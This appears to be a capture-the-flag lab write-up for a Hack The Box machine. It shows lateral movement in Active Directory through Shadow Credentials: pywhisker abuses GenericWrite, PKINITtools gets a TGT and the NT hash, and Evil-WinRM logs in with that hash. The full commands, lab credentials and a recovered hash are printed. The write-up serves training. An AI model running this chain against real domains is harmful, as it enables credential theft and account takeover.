# 04 - Lateral Movement: Shadow Credentials (management_svc)

Objective: Obtain the NTLM credentials of the service user `management_svc`.

Attack Path: MANAGEMENT (Group) $\xrightarrow{\text{GenericWrite}}$ MANAGEMENT_SVC

Prerequisite: Be a member of the `MANAGEMENT` group (achieved in the note [[03-acl-abuse-writeowner]]).

## 🧩 Attack Theory (CPTS)

As members of the `MANAGEMENT` group, we inherit the **GenericWrite** permission over the user `management_svc`.

- **Vulnerability:** This permission allows us to write to the `msDS-KeyCredentialLink` attribute of the target user.
- **Action:** We inject a digital certificate (Key Trust) that we control.
- **Result:** The domain trusts this certificate for Kerberos authentication (PKINIT), allowing us to request a TGT without knowing the user’s real password.

## 1. Credential Injection (pywhisker)

We use `pywhisker` to abuse the permission and add the “Key Credential”.

```bash
# Syntax: pywhisker -d [DOMAIN] -u [MY_USER] -p [MY_PASS] --target [VICTIM] --action "add"
python3 /opt/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

![](<attachments/Pasted image 20260105120808.png>)

- **Key output:** Pay attention to the generated `.pfx` filename and the password shown on screen.
  - `[+] Saved PFX ... at path: <FILE>.pfx` 2
  - `[*] Must be used with password: <PASSWORD>` 3

## 2. Getting the TGT (PKINITtools)

We use the generated certificate (`.pfx`) to authenticate to the KDC and request a Ticket Granting Ticket (TGT).

```bash
# Replace <FILE.pfx> and <PASSWORD> with the data from the previous step
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx <FILE.pfx> -pfx-pass '<PASSWORD>' certified.htb/management_svc management_svc.ccache
```

![](<attachments/Pasted image 20260105121045.png>)

- **Result:** A Kerberos ticket cache file named `management_svc.ccache` is generated5.
- **Note:** The script will also show an `AS-REP Key` in the output, which is useful for the next step6.

## 3. NTLM Hash Extraction (UnPAC the hash)

With the TGT in hand, we can decrypt the PAC structure of the ticket to recover the user’s NTLM hash.

```bash
# Export the variable so impacket/kerberos tools use the ticket
export KRB5CCNAME=management_svc.ccache

# Recover the hash. If it asks for -key, use the AS-REP Key from the previous step.
python3 /opt/PKINITtools/getnthash.py -key <AS_REP_KEY_FROM_PREVIOUS_STEP> certified.htb/management_svc
```

![](<attachments/Pasted image 20260105121247.png>)

- **Result:** `Recovered NT Hash: a091c1832bcdd4677c28b5a6a1295584`

## 4. Remote Access (Evil-WinRM)

Finally, we use the recovered hash to log in. BloodHound confirmed this user has the `CanPSRemote` permission (WinRM enabled).

```bash
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

![](<attachments/Pasted image 20260105121350.png>)

---

**Current Status:**

- **User:** `management_svc`
- **Access:** Interactive shell (WinRM).
- **Next step:** Enumerate from this new user to pivot to `ca_operator` in the note [[05-latmov-ca-operator]].
